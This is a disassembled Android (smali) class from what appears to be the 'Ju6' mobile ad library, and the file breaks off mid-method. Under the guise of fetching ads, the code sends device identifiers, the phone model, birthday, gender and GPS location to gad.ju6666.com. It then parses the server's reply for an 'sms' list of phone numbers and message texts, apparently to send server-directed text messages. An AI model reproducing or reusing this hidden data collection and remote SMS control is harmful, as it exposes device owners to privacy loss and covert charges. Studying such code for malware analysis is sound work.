.class final Lcom/ju6/a;
.super Ljava/lang/Thread;
.source "SourceFile"


# static fields
.field private static a:J

.field private static b:J

.field private static c:I


# instance fields
.field private d:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/ju6/b;",
            ">;"
        }
    .end annotation
.end field

.field private e:Landroid/content/Context;

.field private f:I

.field private g:I

.field private h:I

.field private i:I

.field private j:Ljava/lang/String;

.field private k:Ljava/lang/String;

.field private l:Ljava/lang/String;

.field private m:Ljava/lang/String;

.field private n:Ljava/lang/String;

.field private o:I

.field private p:D

.field private q:D

.field private r:D

.field private s:J

.field private t:Ljava/lang/String;

.field private u:Ljava/lang/String;

.field private v:Lcom/ju6/AdListener;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 64
    const-wide/32 v0, 0x1b7740

    sput-wide v0, Lcom/ju6/a;->a:J

    .line 65
    const-wide/32 v0, 0xea60

    sput-wide v0, Lcom/ju6/a;->b:J

    .line 66
    const/16 v0, 0x2710

    sput v0, Lcom/ju6/a;->c:I

    .line 53
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Lcom/ju6/AdListener;)V
    .locals 1

    .prologue
    const/4 v0, -0x1

    .line 95
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    .line 72
    iput v0, p0, Lcom/ju6/a;->f:I

    .line 82
    iput v0, p0, Lcom/ju6/a;->o:I

    .line 96
    iput-object p1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    .line 97
    iput-object p2, p0, Lcom/ju6/a;->v:Lcom/ju6/AdListener;

    .line 98
    return-void
.end method

.method private a()Ljava/lang/String;
    .locals 4

    .prologue
    const-string v0, "; "

    .line 323
    :try_start_0
    iget-object v0, p0, Lcom/ju6/a;->u:Ljava/lang/String;

    if-nez v0, :cond_3

    .line 324
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    .line 327
    sget-object v1, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 328
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_4

    .line 329
    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 334
    :goto_0
    const-string v1, "; "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 337
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    .line 338
    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v2

    .line 339
    if-eqz v2, :cond_5

    .line 340
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 341
    invoke-virtual {v1}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v1

    .line 342
    if-eqz v1, :cond_0

    .line 343
    const-string v2, "-"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 344
    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 352
    :cond_0
    :goto_1
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 353
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_1

    .line 354
    const-string v2, "; "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 355
    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 357
    :cond_1
    sget-object v1, Landroid/os/Build;->ID:Ljava/lang/String;

    .line 358
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_2

    .line 359
    const-string v2, " Build/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 360
    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 368
    :cond_2
    const-string v1, "Mozilla/5.0 (Linux; U; Android %s) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2 (ju6ad-ANDROID-%s)"

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    const/4 v0, 0x1

    const-string v3, "1.0.3"

    aput-object v3, v2, v0

    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ju6/a;->u:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 375
    :cond_3
    :goto_2
    iget-object v0, p0, Lcom/ju6/a;->u:Ljava/lang/String;

    return-object v0

    .line 332
    :cond_4
    :try_start_1
    const-string v1, "1.0"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 371
    :catch_0
    move-exception v0

    .line 372
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 348
    :cond_5
    :try_start_2
    const-string v1, "en"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1
.end method

.method private static a(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 397
    const/4 v0, 0x0

    .line 399
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_0

    .line 401
    :try_start_0
    const-string v0, "MD5"

    invoke-static {v0}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v0

    .line 402
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {v0, v1, v2, v3}, Ljava/security/MessageDigest;->update([BII)V

    .line 404
    const-string v1, "%032X"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    new-instance v4, Ljava/math/BigInteger;

    const/4 v5, 0x1

    invoke-virtual {v0}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v0

    invoke-direct {v4, v5, v0}, Ljava/math/BigInteger;-><init>(I[B)V

    aput-object v4, v2, v3

    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 411
    :cond_0
    :goto_0
    return-object v0

    .line 407
    :catch_0
    move-exception v0

    const/16 v0, 0x20

    invoke-virtual {p0, v6, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method private static a(Ljava/net/URL;I)Ljava/net/HttpURLConnection;
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 575
    if-nez p0, :cond_0

    move-object v0, v5

    .line 595
    :goto_0
    return-object v0

    .line 580
    :cond_0
    const/4 v0, 0x2

    if-ne p1, v0, :cond_3

    .line 581
    :try_start_0
    new-instance v0, Ljava/net/Proxy;

    sget-object v1, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    new-instance v2, Ljava/net/InetSocketAddress;

    .line 582
    const-string v3, "10.0.0.172"

    const/16 v4, 0x50

    invoke-direct {v2, v3, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 581
    invoke-direct {v0, v1, v2}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 584
    :goto_1
    const/16 v1, 0x8

    if-ne p1, v1, :cond_1

    .line 585
    new-instance v0, Ljava/net/Proxy;

    sget-object v1, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    new-instance v2, Ljava/net/InetSocketAddress;

    .line 586
    const-string v3, "10.0.0.200"

    const/16 v4, 0x50

    invoke-direct {v2, v3, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 585
    invoke-direct {v0, v1, v2}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 589
    :cond_1
    if-eqz v0, :cond_2

    .line 590
    invoke-virtual {p0, v0}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object p0

    check-cast p0, Ljava/net/HttpURLConnection;

    move-object v0, p0

    goto :goto_0

    .line 592
    :cond_2
    invoke-virtual {p0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p0

    check-cast p0, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, p0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v0, v5

    goto :goto_0

    :cond_3
    move-object v0, v5

    goto :goto_1
.end method

.method private a(I)V
    .locals 1

    .prologue
    .line 137
    iget-object v0, p0, Lcom/ju6/a;->v:Lcom/ju6/AdListener;

    if-nez v0, :cond_0

    .line 140
    :goto_0
    return-void

    .line 139
    :cond_0
    iget-object v0, p0, Lcom/ju6/a;->v:Lcom/ju6/AdListener;

    invoke-interface {v0, p1}, Lcom/ju6/AdListener;->onReceiveAd(I)V

    goto :goto_0
.end method

.method private static a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3

    .prologue
    const-string v0, "UTF-8"

    .line 886
    if-eqz p2, :cond_0

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    .line 888
    :try_start_0
    const-string v0, "&"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "UTF-8"

    invoke-static {p1, v1}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    .line 889
    const-string v1, "="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "UTF-8"

    invoke-static {p2, v1}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 896
    :cond_0
    :goto_0
    return-void

    .line 890
    :catch_0
    move-exception v0

    .line 891
    const-string v1, "Ju6 Ad"

    .line 892
    const-string v2, "UTF-8 encoding is not supported on this device.  Ad requests are impossible."

    .line 891
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0
.end method

.method private static b(Ljava/lang/String;)Ljava/util/List;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/List",
            "<",
            "Lcom/ju6/b;",
            ">;"
        }
    .end annotation

    .prologue
    .line 900
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 902
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 905
    :try_start_1
    const-string v2, "interval"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 906
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    .line 907
    mul-int/lit8 v2, v2, 0x3c

    mul-int/lit16 v2, v2, 0x3e8

    int-to-long v2, v2

    sput-wide v2, Lcom/ju6/a;->a:J
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 911
    :goto_0
    :try_start_2
    const-string v2, "sms"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    .line 913
    const/4 v2, 0x0

    :goto_1
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-lt v2, v3, :cond_0

    .line 923
    :goto_2
    return-object v0

    .line 914
    :cond_0
    new-instance v3, Lcom/ju6/b;

    invoke-direct {v3}, Lcom/ju6/b;-><init>()V

    .line 915
    invoke-virtual {v1, v2}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    .line 916
    const-string v5, "smsmobile"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v3, Lcom/ju6/b;->a:Ljava/lang/String;

    .line 917
    const-string v5, "content"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/ju6/b;->b:Ljava/lang/String;

    .line 918
    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0

    .line 913
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 920
    :catch_0
    move-exception v1

    goto :goto_2

    .line 908
    :catch_1
    move-exception v2

    goto :goto_0
.end method

.method private b()Z
    .locals 10

    .prologue
    const/4 v9, 0x0

    const/4 v8, 0x1

    const/4 v7, 0x0

    .line 601
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 605
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    new-instance v4, Ljava/lang/StringBuilder;

    const-wide/16 v5, 0x3e8

    div-long v5, v2, v5

    invoke-static {v5, v6}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "."

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-wide/16 v5, 0x3e8

    rem-long/2addr v2, v5

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/ju6/a;->t:Ljava/lang/String;

    if-nez v3, :cond_1

    iget-object v3, p0, Lcom/ju6/a;->m:Ljava/lang/String;

    if-nez v3, :cond_0

    iget-object v3, p0, Lcom/ju6/a;->j:Ljava/lang/String;

    if-eqz v3, :cond_1

    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/ju6/a;->m:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lcom/ju6/a;->j:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/ju6/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/ju6/a;->t:Ljava/lang/String;

    :cond_1
    iget-object v3, p0, Lcom/ju6/a;->t:Ljava/lang/String;

    const-string v4, "z"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "a"

    invoke-static {}, Lcom/ju6/AdManager;->getAppid()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "p"

    invoke-static {}, Lcom/ju6/AdManager;->getPwd()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "m"

    invoke-static {}, Lcom/ju6/AdManager;->isTestmode()Z

    move-result v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "v"

    const-string v5, "1.0.3"

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "c"

    iget v5, p0, Lcom/ju6/a;->f:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "l"

    iget v5, p0, Lcom/ju6/a;->g:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "cc"

    iget v5, p0, Lcom/ju6/a;->h:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "nc"

    iget v5, p0, Lcom/ju6/a;->i:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "e"

    iget-object v5, p0, Lcom/ju6/a;->j:Ljava/lang/String;

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "s"

    iget-object v5, p0, Lcom/ju6/a;->l:Ljava/lang/String;

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "d"

    iget-object v5, p0, Lcom/ju6/a;->k:Ljava/lang/String;

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "t"

    invoke-static {v1, v4, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "b"

    invoke-static {}, Lcom/ju6/AdManager;->getBirthdayAsString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "g"

    invoke-static {}, Lcom/ju6/AdManager;->getGenderAsString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "k"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v5, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v2, 0x20

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/ju6/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v4, v2}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "mo"

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "n"

    iget-object v3, p0, Lcom/ju6/a;->n:Ljava/lang/String;

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "la"

    iget-wide v3, p0, Lcom/ju6/a;->p:D

    invoke-static {v3, v4}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "lo"

    iget-wide v3, p0, Lcom/ju6/a;->q:D

    invoke-static {v3, v4}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "ac"

    iget-wide v3, p0, Lcom/ju6/a;->r:D

    invoke-static {v3, v4}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "gt"

    iget-wide v3, p0, Lcom/ju6/a;->s:J

    invoke-static {v3, v4}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/ju6/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 613
    :try_start_1
    const-string v2, "http://gad.ju6666.com/adserver/android/1.0/GetAd"

    const-string v3, "?"

    invoke-virtual {v2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-ltz v2, :cond_2

    .line 615
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://gad.ju6666.com/adserver/android/1.0/GetAd&"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 620
    :goto_0
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 622
    iget v1, p0, Lcom/ju6/a;->o:I

    invoke-static {v2, v1}, Lcom/ju6/a;->a(Ljava/net/URL;I)Ljava/net/HttpURLConnection;

    move-result-object v1

    .line 624
    const-string v2, "GET"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 625
    const-string v2, "User-Agent"

    invoke-direct {p0}, Lcom/ju6/a;->a()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/net/HttpURLConnection;->addRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 626
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 637
    sget v2, Lcom/ju6/a;->c:I

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 638
    sget v2, Lcom/ju6/a;->c:I

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 643
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    .line 644
    new-instance v3, Ljava/io/BufferedWriter;

    new-instance v4, Ljava/io/OutputStreamWriter;

    invoke-direct {v4, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 647
    :try_start_2
    invoke-virtual {v3}, Ljava/io/BufferedWriter;->close()V

    .line 648
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->connect()V

    .line 649
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/InputStreamReader;

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 650
    :goto_1
    :try_start_3
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move-result-object v1

    if-nez v1, :cond_3

    .line 660
    :try_start_4
    invoke-virtual {v3}, Ljava/io/BufferedWriter;->close()V

    .line 665
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 683
    :goto_2
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 685
    invoke-static {v0}, Lcom/ju6/a;->b(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    .line 686
    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    if-eqz v0, :cond_8

    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_8

    move v1, v7

    .line 687
    :goto_3
    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lt v1, v0, :cond_7

    .line 701
    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    invoke-direct {p0, v0}, Lcom/ju6/a;->a(I)V

    .line 709
    :goto_4
    return v8

    .line 617
    :cond_2
    :try_start_5
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://gad.ju6666.com/adserver/android/1.0/GetAd?"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    move-result-object v1

    goto/16 :goto_0

    .line 652
    :cond_3
    :try_start_6
